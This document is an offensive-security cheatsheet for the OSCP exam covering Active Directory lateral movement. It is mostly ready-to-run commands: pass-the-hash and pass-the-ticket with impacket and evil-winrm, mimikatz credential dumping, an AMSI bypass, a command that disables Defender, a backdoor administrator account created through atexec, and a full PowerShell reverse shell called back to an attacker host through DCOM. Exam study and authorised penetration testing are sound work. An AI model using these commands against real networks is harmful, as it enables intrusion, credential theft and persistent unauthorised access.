# Active Directory — OSCP Cheatsheet Part 3A
## Lateral Movement — WMI + WinRM + PsExec + DCOM + Pass-the-Ticket

> **Legend:**
> `[KALI]` = Run on Kali (attack machine)
> `[WINDOWS]` = Run on victim/foothold Windows machine

---

## Lateral Movement — Master Decision Tree

```
Valid Creds or NT Hash available?
            │
            ▼
nxc smb 192.168.x.0/24 -u USER -p PASS (or -H HASH)
            │
            ▼
    (Pwn3d!) found?
            │
     ┌──────┴──────┐
    YES            NO
     │              └── Try other users/hashes
     ▼
Check open ports on target
            │
     ┌──────┴─────────────┬────────────────┐
     │                    │                │
  Port 5985            Port 445         Port 135
  (WinRM)              (SMB)            (WMI/DCOM)
     │                    │                │
     ▼                    ▼                ▼
evil-winrm          wmiexec (quiet)    dcomexec
[Best shell]        psexec (SYSTEM)    [Last resort]
                    smbexec (stealth)
                    atexec (cmd only)
```

---

## STEP 1 — Network Recon from Foothold

### Map the Network First
`[WINDOWS]`
```cmd
# Your IP + subnet + DNS (DNS = almost always DC)
ipconfig /all

# Recently connected machines (ARP cache)
arp -a

# Domain machines list
net view
net view /domain:corp.local

# Active connections — who is talking to this machine
netstat -ano

# Routing table — other subnets?
route print
```

### Identify DC from ipconfig
```
DNS Servers: 192.168.1.10    ← THIS IS YOUR DC (almost always)
```

### Sweep from Kali
`[KALI]`
```bash
# Find all live SMB hosts
nxc smb 192.168.1.0/24

# Find where your creds work as admin
nxc smb 192.168.1.0/24 -u Administrator -p 'Password123!' -d corp.local

# Same with NT hash
nxc smb 192.168.1.0/24 -u Administrator -H 32ed87bdb5fdc5e9cba88547376818d4

# Check WinRM on all hosts
nxc winrm 192.168.1.0/24 -u Administrator -p 'Password123!'

# Check WMI on all hosts
nxc wmi 192.168.1.0/24 -u Administrator -p 'Password123!'
```

### Confirm Admin Access Before Moving
`[KALI]`
```bash
# SMB admin check
nxc smb 192.168.1.21 -u Administrator -p 'Password123!'
# [+] CORP\Administrator:Password123! (Pwn3d!) ← GO
# [+] CORP\Administrator:Password123!           ← valid but NOT admin

# WinRM admin check
nxc winrm 192.168.1.21 -u Administrator -p 'Password123!'
# (Pwn3d!) = can get shell via evil-winrm
```

---

## STEP 2 — WMI (Port 135)

### From Windows — wmic
`[WINDOWS]`
```cmd
# Execute command on remote machine — output to file
wmic /node:192.168.1.21 /user:CORP\Administrator /password:Password123! ^
  process call create "cmd.exe /c whoami > C:\Temp\out.txt"

# Read the output file
type \\192.168.1.21\C$\Temp\out.txt

# Run reverse shell
wmic /node:192.168.1.21 /user:CORP\Administrator /password:Password123! ^
  process call create "powershell -nop -w hidden -e BASE64PAYLOAD"
```

### impacket-wmiexec — Preferred Remote Shell
`[KALI]`
```bash
# Password
impacket-wmiexec corp.local/Administrator:Password123!@192.168.1.21

# NT Hash (PtH)
impacket-wmiexec corp.local/Administrator@192.168.1.21 \
  -hashes :32ed87bdb5fdc5e9cba88547376818d4

# LM:NT format
impacket-wmiexec corp.local/Administrator@192.168.1.21 \
  -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4

# Specify domain
impacket-wmiexec corp.local/Administrator@192.168.1.21 \
  -hashes :NTHASH -dc-ip 192.168.1.10
```

**Shell looks like:**
```
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell

C:\Windows\system32> whoami
corp\administrator

C:\Windows\system32> hostname
WS02
```

**File transfer inside wmiexec:**
```bash
# Upload Kali → Target
C:\Windows\system32> lput /opt/mimikatz.exe C:\Temp\mimikatz.exe

# Download Target → Kali
C:\Windows\system32> lget C:\Temp\loot.txt /tmp/loot.txt
```

### NetExec WMI — Quick Command
`[KALI]`
```bash
# Run single command, output in terminal
nxc wmi 192.168.1.21 -u Administrator -p 'Password123!' -x "whoami"
nxc wmi 192.168.1.21 -u Administrator -p 'Password123!' -x "net localgroup administrators"
nxc wmi 192.168.1.21 -u Administrator -H NTHASH -x "ipconfig /all"

# PowerShell command
nxc wmi 192.168.1.21 -u Administrator -p 'Password123!' -X "Get-Process"
```

### WMI Errors + Fixes
| Error | Cause | Fix |
|-------|-------|-----|
| `Access Denied` | No admin rights | Try different user/hash |
| `WBEM_E_ACCESS_DENIED` | Firewall blocking | Check port 135 open |
| Timeout | WMI service stopped | Try psexec or winrm |
| `RPC unavailable` | Port 135 closed | `nmap -p 135 TARGET` |

---

## STEP 3 — WinRM / Evil-WinRM (Port 5985)

### Check Prerequisites
`[KALI]`
```bash
# Port check
nmap -p 5985,5986 192.168.1.21

# Admin access confirm
nxc winrm 192.168.1.21 -u Administrator -p 'Password123!'
# (Pwn3d!) = shell possible
```

### evil-winrm — Full Guide
`[KALI]`
```bash
# Install
gem install evil-winrm

# Password
evil-winrm -i 192.168.1.21 -u Administrator -p 'Password123!'

# NT Hash (PtH)
evil-winrm -i 192.168.1.21 -u Administrator -H 32ed87bdb5fdc5e9cba88547376818d4

# With domain
evil-winrm -i 192.168.1.21 -u Administrator -p 'Password123!' -d corp.local

# Load PowerShell scripts from folder automatically
evil-winrm -i 192.168.1.21 -u Administrator -H NTHASH -s /opt/scripts/

# SSL (port 5986)
evil-winrm -i 192.168.1.21 -u Administrator -p 'Password123!' -S
```

**Shell:**
```powershell
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### evil-winrm Features Inside Shell
```powershell
# Upload file to target
*Evil-WinRM* PS> upload /opt/mimikatz.exe C:\Temp\mimikatz.exe
*Evil-WinRM* PS> upload /opt/SharpHound.exe

# Download file from target
*Evil-WinRM* PS> download C:\Temp\sam.bak /tmp/sam.bak
*Evil-WinRM* PS> download C:\Users\Administrator\Desktop\flag.txt /tmp/

# AMSI bypass (built-in)
*Evil-WinRM* PS> Bypass-4MSI

# Show available commands
*Evil-WinRM* PS> menu

# Import loaded script (after -s flag)
*Evil-WinRM* PS> Import-Module PowerView.ps1

# Run PowerShell directly
*Evil-WinRM* PS> Get-NetUser | select samaccountname
*Evil-WinRM* PS> whoami /priv
*Evil-WinRM* PS> net localgroup administrators
```

### PowerShell Remoting (Windows to Windows)
`[WINDOWS]`
```powershell
# Interactive session
Enter-PSSession -ComputerName WS02.corp.local -Credential (Get-Credential)

# Single command
$cred = New-Object System.Management.Automation.PSCredential("CORP\Administrator", (ConvertTo-SecureString "Password123!" -AsPlainText -Force))
Invoke-Command -ComputerName WS02 -ScriptBlock {whoami} -Credential $cred

# Multiple commands
Invoke-Command -ComputerName WS02 -Credential $cred -ScriptBlock {
    whoami
    hostname
    ipconfig /all
    net localgroup administrators
}

# Run script block and save output
$result = Invoke-Command -ComputerName WS02 -Credential $cred -ScriptBlock {
    Get-Process | Where-Object {$_.Name -eq "lsass"}
}
```

---

## STEP 4 — PsExec + Variants (Port 445)

### How PsExec Works
```
Step 1: Connect to ADMIN$ share (C:\Windows\)
Step 2: Upload random-named service binary
Step 3: Register + start service via SCM
Step 4: Service runs as SYSTEM → shell
Step 5: Shell exits → service + binary deleted

Result: SYSTEM shell (not admin — SYSTEM)
Noise:  HIGH — service create/delete in Event Logs
```

### impacket-psexec
`[KALI]`
```bash
# Password
impacket-psexec corp.local/Administrator:Password123!@192.168.1.21

# NT Hash
impacket-psexec corp.local/Administrator@192.168.1.21 \
  -hashes :32ed87bdb5fdc5e9cba88547376818d4

# LM:NT
impacket-psexec corp.local/Administrator@192.168.1.21 \
  -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
```

**Output:**
```
[*] Requesting shares on 192.168.1.21
[*] Found writable share ADMIN$
[*] Uploading file xYzAbCdE.exe          ← binary upload
[*] Creating service AbCd
[*] Starting service AbCd
C:\Windows\system32> whoami
nt authority\system                       ← SYSTEM shell
```

### impacket-smbexec — Stealthier
`[KALI]`
```bash
# NT Hash
impacket-smbexec corp.local/Administrator@192.168.1.21 \
  -hashes :32ed87bdb5fdc5e9cba88547376818d4

# Password
impacket-smbexec corp.local/Administrator:Password123!@192.168.1.21
```

> No binary uploaded to disk — uses cmd.exe directly.
> Slower than psexec but better against AV.

### impacket-atexec — Single Command Only
`[KALI]`
```bash
# Run one command, get output, done
impacket-atexec corp.local/Administrator@192.168.1.21 \
  -hashes :NTHASH "whoami"

impacket-atexec corp.local/Administrator@192.168.1.21 \
  -hashes :NTHASH "net localgroup administrators"

impacket-atexec corp.local/Administrator@192.168.1.21 \
  -hashes :NTHASH "ipconfig /all"

# Add a backdoor user
impacket-atexec corp.local/Administrator@192.168.1.21 \
  -hashes :NTHASH "net user hacker Password123! /add && net localgroup administrators hacker /add"
```

### Tools Comparison
| Tool | Shell Type | Noise | Port | Best For |
|------|-----------|-------|------|----------|
| `psexec` | SYSTEM interactive | 🔴 High | 445 | Need SYSTEM shell |
| `wmiexec` | Admin semi-interactive | 🟡 Medium | 135 | **Default choice** |
| `smbexec` | Admin semi-interactive | 🟡 Medium | 445 | AV blocks psexec |
| `atexec` | Single command | 🟢 Low | 445 | Quick recon cmd |
| `evil-winrm` | PowerShell interactive | 🟡 Medium | 5985 | WinRM open |
| `dcomexec` | Semi-interactive | 🟢 Low | 135 | All else fails |

### Common Errors
| Error | Cause | Fix |
|-------|-------|-----|
| `STATUS_LOGON_FAILURE` | Wrong creds/hash | Verify credentials |
| `STATUS_ACCESS_DENIED` | Not admin on target | Try different user |
| `[-] ADMIN$ not accessible` | Admin share disabled | Use smbexec |
| Port 445 blocked | Firewall rule | Try WinRM or WMI |
| `Invalid parameter` | Wrong hash format | Use `:NTHASH` format |

---

## STEP 5 — DCOM (Port 135)

### When to Use
```
Try order:
1. evil-winrm  (port 5985) → FAIL?
2. wmiexec     (port 135)  → FAIL?
3. psexec      (port 445)  → FAIL?
4. smbexec     (port 445)  → FAIL?
         ↓
5. dcomexec    (port 135)  ← try this
```

### MMC20.Application — From Windows
`[WINDOWS]`
```powershell
# Create remote DCOM object
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.21"))

# Execute command on target
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami > C:\Temp\out.txt","7")

# Reverse shell (set up nc -lvnp 4444 on Kali first)
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c powershell -nop -w hidden -c `$c=New-Object Net.Sockets.TCPClient('KALI_IP',4444);`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){`$d=(New-Object Text.ASCIIEncoding).GetString(`$b,0,`$i);`$r=(iex `$d 2>&1|Out-String);`$r2=`$r+'PS '+(pwd).Path+'> ';`$sb=[text.encoding]::ASCII.GetBytes(`$r2);`$s.Write(`$sb,0,`$sb.Length);`$s.Flush()}","7")
```

### impacket-dcomexec
`[KALI]`
```bash
# MMC20 object (most common)
impacket-dcomexec corp.local/Administrator:Password123!@192.168.1.21 -object MMC20

# NT Hash
impacket-dcomexec corp.local/Administrator@192.168.1.21 \
  -hashes :NTHASH \
  -object MMC20

# Try different objects if MMC20 fails
impacket-dcomexec corp.local/Administrator@192.168.1.21 \
  -hashes :NTHASH -object ShellWindows

impacket-dcomexec corp.local/Administrator@192.168.1.21 \
  -hashes :NTHASH -object ShellBrowserWindow
```

---

## STEP 6 — Pass-the-Ticket (PtT)

### Concept
```
PtH  →  NT Hash     →  NTLM Authentication
PtT  →  .kirbi/.ccache ticket  →  Kerberos Authentication

Use PtT when:
- NTLM blocked on network
- Kerberos-only environment
- Stole a DA's ticket (jackpot)
```

### Get Tickets — From Windows
`[WINDOWS]`
```powershell
# Mimikatz — export all tickets as .kirbi files
mimikatz # sekurlsa::tickets /export
# Files saved in current directory:
# [0;123456]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi

# List what was exported
dir *.kirbi

# Rubeus — dump tickets
Rubeus.exe dump /service:krbtgt
Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# Rubeus — dump specific user
Rubeus.exe dump /user:Administrator /nowrap
```

### Get Tickets — From Kali (With Creds)
`[KALI]`
```bash
# Generate TGT from password
impacket-getTGT corp.local/Administrator:Password123! -dc-ip 192.168.1.10

# Generate TGT from NT hash
impacket-getTGT corp.local/Administrator \
  -hashes :32ed87bdb5fdc5e9cba88547376818d4 \
  -dc-ip 192.168.1.10

# Output: Administrator.ccache
ls -la *.ccache
```

### Use Ticket — Linux (impacket)
`[KALI]`
```bash
# Step 1 — Set environment variable
export KRB5CCNAME=/path/to/Administrator.ccache

# Step 2 — Use with impacket tools (-k -no-pass)
# IMPORTANT: Use HOSTNAME not IP with Kerberos!

impacket-psexec corp.local/Administrator@DC01.corp.local -k -no-pass
impacket-wmiexec corp.local/Administrator@WS02.corp.local -k -no-pass
impacket-smbclient corp.local/Administrator@DC01.corp.local -k -no-pass
impacket-secretsdump corp.local/Administrator@DC01.corp.local -k -no-pass

# Verify ticket info
impacket-describeTicket Administrator.ccache
```

### Use Ticket — Windows (Rubeus)
`[WINDOWS]`
```powershell
# Inject ticket from base64
Rubeus.exe ptt /ticket:BASE64TICKETHERE

# Inject from .kirbi file
Rubeus.exe ptt /ticket:Administrator@krbtgt-CORP.LOCAL.kirbi

# Verify ticket injected
klist

# Now use Windows commands normally
dir \\DC01\C$
net use \\DC01\C$
Enter-PSSession -ComputerName DC01

# Clear tickets when done
klist purge
```

### Overpass-the-Hash (OPtH) — Hash → Kerberos TGT
`[WINDOWS]`
```powershell
# Mimikatz — new process with Kerberos context
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:NTHASH /run:powershell.exe
# New PowerShell window opens with Kerberos tickets

# Rubeus — request TGT and inject
Rubeus.exe asktgt /user:Administrator /rc4:NTHASH /ptt
Rubeus.exe asktgt /user:Administrator /aes256:AESHASH /ptt

# Verify
klist
```

---

## Complete Lateral Movement Playbook

### Phase 1 — Discover + Confirm
`[KALI]`
```bash
# 1. Map all live SMB hosts
nxc smb 192.168.1.0/24

# 2. Find where creds work as admin
nxc smb 192.168.1.0/24 -u Administrator -p 'Password123!' -d corp.local
nxc smb 192.168.1.0/24 -u Administrator -H NTHASH

# 3. Check WinRM too
nxc winrm 192.168.1.0/24 -u Administrator -p 'Password123!'
```

### Phase 2 — Get Shell (Try in Order)
`[KALI]`
```bash
# Option 1 — evil-winrm (best)
nxc winrm TARGET_IP -u Administrator -p 'Password123!'  # confirm Pwn3d!
evil-winrm -i TARGET_IP -u Administrator -p 'Password123!'

# Option 2 — wmiexec (quiet)
impacket-wmiexec corp.local/Administrator:Password123!@TARGET_IP

# Option 3 — psexec (SYSTEM, noisy)
impacket-psexec corp.local/Administrator:Password123!@TARGET_IP

# Option 4 — smbexec (stealth)
impacket-smbexec corp.local/Administrator:Password123!@TARGET_IP

# Option 5 — dcomexec (last resort)
impacket-dcomexec corp.local/Administrator:Password123!@TARGET_IP -object MMC20
```

### Phase 3 — Harvest More Credentials
`[WINDOWS / via shell]`
```powershell
# On new machine — run mimikatz
*Evil-WinRM* PS> upload /opt/mimikatz.exe C:\Temp\mimikatz.exe
*Evil-WinRM* PS> Bypass-4MSI
*Evil-WinRM* PS> Set-MpPreference -DisableRealtimeMonitoring $true
*Evil-WinRM* PS> C:\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Or remote secretsdump
impacket-secretsdump corp.local/Administrator:Password123!@TARGET_IP
```

### Phase 4 — Repeat Until DC
```
New hashes/creds → nxc sweep → Pwn3d! on DC?
    YES → secretsdump DC → NTDS.dit → ALL hashes → Part 3B
    NO  → lateral move to next machine → repeat
```

---

## Quick Reference — All Lateral Movement Commands

### With Password
```bash
evil-winrm   -i TARGET -u USER -p 'PASS'
impacket-wmiexec  DOMAIN/USER:PASS@TARGET
impacket-psexec   DOMAIN/USER:PASS@TARGET
impacket-smbexec  DOMAIN/USER:PASS@TARGET
impacket-dcomexec DOMAIN/USER:PASS@TARGET -object MMC20
```

### With NT Hash
```bash
evil-winrm   -i TARGET -u USER -H NTHASH
impacket-wmiexec  DOMAIN/USER@TARGET -hashes :NTHASH
impacket-psexec   DOMAIN/USER@TARGET -hashes :NTHASH
impacket-smbexec  DOMAIN/USER@TARGET -hashes :NTHASH
impacket-dcomexec DOMAIN/USER@TARGET -hashes :NTHASH -object MMC20
```

### With Kerberos Ticket
```bash
export KRB5CCNAME=/path/to/ticket.ccache
impacket-wmiexec DOMAIN/USER@HOSTNAME -k -no-pass
impacket-psexec  DOMAIN/USER@HOSTNAME -k -no-pass
# Note: Use HOSTNAME not IP with Kerberos!
```

### Quick Command (No Shell)
```bash
nxc smb  TARGET -u USER -p PASS -x "COMMAND"      # SMB
nxc wmi  TARGET -u USER -p PASS -x "COMMAND"      # WMI
impacket-atexec DOMAIN/USER@TARGET -hashes :HASH "COMMAND"
```

---

## PtH vs PtT vs OPtH — When to Use

| Technique | Input | Auth Protocol | Use When |
|-----------|-------|---------------|----------|
| Pass-the-Hash | NT Hash | NTLM | Default — NTLM available |
| Pass-the-Ticket | .ccache/.kirbi | Kerberos | NTLM blocked / have DA ticket |
| Overpass-the-Hash | NT Hash → TGT | Kerberos | Have hash, need Kerberos auth |

---

## Kerberos Reminder — Hostname Not IP

```bash
# WRONG — Kerberos cannot resolve
impacket-psexec corp.local/Admin@192.168.1.10 -k -no-pass

# CORRECT — Use hostname
impacket-psexec corp.local/Admin@DC01.corp.local -k -no-pass

# Make sure /etc/hosts has the entry
echo "192.168.1.10 DC01.corp.local DC01" >> /etc/hosts
```

---

## Tools Install Check

`[KALI]`
```bash
which evil-winrm impacket-wmiexec impacket-psexec impacket-smbexec impacket-atexec impacket-dcomexec impacket-getTGT nxc

# evil-winrm
sudo gem install evil-winrm

# impacket
pip install impacket
sudo apt install python3-impacket

# netexec
pip install netexec

# kerbrute (for PtT verification)
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute
chmod +x /usr/local/bin/kerbrute
```

---

Lateral Movement — Decision Tree

```

Valid Credentials or NTLM Hash Obtained
                ↓
Run: nxc smb /24 → Where do you have admin access (Pwn3d!)?
                ↓
Is Port 5985 open?
        YES → Use Evil-WinRM
                → Best interactive PowerShell shell

        NO ↓

Is Port 445 (SMB) open?
        YES → Use wmiexec (quieter/stealthier)
                OR
                Use psexec (can provide SYSTEM access)

        NO ↓

Is Port 135 (RPC/DCOM) open?
        YES → Use dcomexec
                → Remote command execution via DCOM

        NO ↓

Is PowerShell Remoting enabled?
        YES → Use Enter-PSSession or Invoke-Command
                → Remote PowerShell access 
 ```
               
## OSCP Exam Tips

```
1. Always run nxc smb /24 after every new credential — find ALL Pwn3d! hosts
2. evil-winrm first — best shell, file transfer built-in
3. wmiexec if no WinRM — quieter than psexec, no service creation
4. Always upload mimikatz to new machines — more creds = more paths
5. secretsdump remotely before bothering with local mimikatz
6. Use hostname NOT IP with -k -no-pass Kerberos attacks
7. After every new machine → BloodHound mark as Owned → check new paths
8. ipconfig /all on every new machine — find new subnets to pivot into
9. arp -a on every new machine — find machines that talked to this one recently
10. Never spray on new machine without checking password policy first
```

---

*Part 3A — Lateral Movement*
*Next → Part 3B: DCSync + Domain Admin Compromise + Post-Exploitation*
